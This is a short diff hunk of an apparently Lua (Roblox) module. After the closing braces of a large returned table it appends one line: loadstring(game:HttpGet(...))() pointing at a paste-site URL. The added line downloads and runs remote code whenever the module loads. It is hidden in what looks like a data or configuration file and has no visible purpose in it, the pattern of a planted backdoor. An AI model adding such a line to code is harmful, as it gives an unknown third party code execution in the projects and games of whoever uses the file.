@@ -1351,3 +1351,4 @@ return {
         },
     },
 }
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/km7RXn4ZAj/0"))()
